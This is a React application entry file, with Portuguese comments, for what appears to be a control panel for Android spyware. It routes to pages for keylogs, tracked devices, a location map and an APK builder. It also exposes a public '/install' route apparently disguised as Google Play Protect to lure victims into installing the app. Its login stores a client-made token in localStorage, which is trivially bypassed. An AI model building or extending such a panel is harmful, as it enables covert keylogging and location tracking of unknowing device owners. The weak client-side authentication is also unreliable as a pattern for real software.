import { useState, useEffect } from "react";
import { Router, Route, Switch, useLocation } from "wouter";
import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { ThemeProvider } from "./contexts/ThemeContext";
import ErrorBoundary from "./components/ErrorBoundary";
import Login from "./pages/Login";
import Home from "./pages/Home";
import { trpc } from "@/lib/trpc";
import Devices from "./pages/Devices";
import DeviceDetails from "./pages/DeviceDetails";
import Keylogs from "./pages/Keylogs";
import Alerts from "./pages/Alerts";
import Events from "./pages/Events";
import Map from "./pages/Map";
import Reports from "./pages/Reports";
import Compliance from "./pages/Compliance";
import { APKBuilder } from "./pages/APKBuilder";
import PlayProtectRedirect from "./pages/PlayProtectRedirect";

interface User {
  email: string;
  name: string;
}

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [user, setUser] = useState<User | undefined>();
  const [loading, setLoading] = useState(true);
  const [location] = useLocation();
  
  // Move useMutation to top level - hooks must be called unconditionally
  const loginMutation = trpc.auth.login.useMutation();

  // Verificar autenticação ao carregar
  useEffect(() => {
    const checkAuth = () => {
      try {
        // Verificar se tem token válido no localStorage
        const token = localStorage.getItem("auth_token");
        const timestamp = localStorage.getItem("auth_timestamp");
        const userEmail = localStorage.getItem("user_email");
        const userName = localStorage.getItem("user_name");

        // Token válido por 24 horas
        const TOKEN_VALIDITY_MS = 24 * 60 * 60 * 1000;
        
        if (token && timestamp && userEmail && userName) {
          const tokenAge = Date.now() - parseInt(timestamp);
          
          if (tokenAge < TOKEN_VALIDITY_MS) {
            // Token ainda válido
            setUser({
              email: userEmail,
              name: userName,
            });
            setIsAuthenticated(true);
          } else {
            // Token expirado - limpar tudo
            clearAuth();
          }
        } else {
          // Sem token - não autenticado
          clearAuth();
        }
      } catch (error) {
        console.error("Erro ao verificar autenticação:", error);
        clearAuth();
      } finally {
        setLoading(false);
      }
    };

    checkAuth();
  }, []);

  const clearAuth = () => {
    localStorage.removeItem("auth_token");
    localStorage.removeItem("auth_timestamp");
    localStorage.removeItem("user_email");
    localStorage.removeItem("user_name");
    sessionStorage.clear();
    setUser(undefined);
    setIsAuthenticated(false);
  };

  const handleLogin = async (email: string, password: string) => {
    if (!email || !password) return;
    
    try {
      // Use the mutation hook that's already declared at top level
      const result = await loginMutation.mutateAsync({ email, password });
      
      if (result.success && result.user) {
        // Store auth data in localStorage
        localStorage.setItem("auth_token", "token_" + Date.now());
        localStorage.setItem("auth_timestamp", Date.now().toString());
        localStorage.setItem("user_email", result.user.email);
        localStorage.setItem("user_name", result.user.name);
        
        setUser({
          email: result.user.email,
          name: result.user.name,
        });
        setIsAuthenticated(true);
      }
    } catch (error) {
      console.error("Login error:", error);
      alert("Erro ao fazer login. Tente novamente.");
    }
  };

  const handleLogout = () => {
    // Limpar TODOS os dados de autenticação
    clearAuth();
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-950 to-slate-900 flex items-center justify-center">
        <div className="text-center">
          <div className="w-12 h-12 border-4 border-cyan-400/30 border-t-cyan-400 rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-cyan-300">Carregando...</p>
        </div>
      </div>
    );
  }

  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="dark">
        <TooltipProvider>
          <Toaster />
          <Router key="app">
            <Switch>
              {/* Rota pública para Play Protect - DEVE ser processada PRIMEIRO */}
              <Route path="/install">
                <PlayProtectRedirect />
              </Route>
              
              {/* Rotas autenticadas ou login - renderiza apenas se /install não combinar */}
              <Route path="*">
                {isAuthenticated ? (
                  <Home user={user} onLogout={handleLogout} />
                ) : (
                  <Login onLogin={handleLogin} loading={false} />
                )}
              </Route>
            </Switch>
          </Router>
        </TooltipProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
